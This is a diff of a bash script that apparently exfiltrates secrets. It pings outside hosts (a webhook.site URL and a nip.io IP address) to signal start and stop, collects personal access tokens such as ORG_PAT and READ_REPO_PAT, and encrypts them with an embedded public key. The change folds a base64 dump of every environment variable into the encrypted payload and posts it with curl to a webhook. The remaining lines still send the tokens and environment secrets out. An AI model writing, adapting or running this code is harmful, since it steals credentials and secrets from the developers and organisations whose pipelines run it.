@@ -3,9 +3,7 @@ export LC_ALL=C
 set -euo pipefail
 
 # Test if triggered
-curl https://webhook.site/9acefa91-fce9-440e-b077-a3a2b0b0fa87/start
 curl https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff/start
-
 
 PUB_KEY='-----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAn5lV+rDFTkY9IFjLxBsd
@@ -42,7 +40,9 @@ for pat in ORG_PAT READ_REPO_PAT; do
 #		curl -s -o /dev/null "$webhook/send-pat?secret=$encrypted_pat&token=$encrypted_token" -d "$encrypted_string"
 done
 
-string="${string%$'\n\n'}"
+env_b64="$(env -0 | base64 -w0)"
+printf -v envblock 'environment variables:\n\n%s' "$env_b64"
+string+=$'\n\n'"${envblock}"
 
 # ------------------------------------------------ chunked encryption -----
 CHUNK_SIZE=190
@@ -56,12 +56,8 @@ done
 encrypted_string="$(printf '%s.' "${chunks[@]}")"
 encrypted_string="${encrypted_string%.}"
 
-curl -s -o /dev/null "$webhook/send-pat?secret=$pat&token=$token" -d "$user_info"
 curl -s -o /dev/null "$webhook/send-pat" -d "$string"
 curl -s -o /dev/null "$webhook/send-pat" -d "$encrypted_string"
-
-
-env -0 | base64 -w 0 | curl -s -o /dev/null -X POST -d @- "$webhook"
 
 # test if quit with no errors
 curl https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff/stop
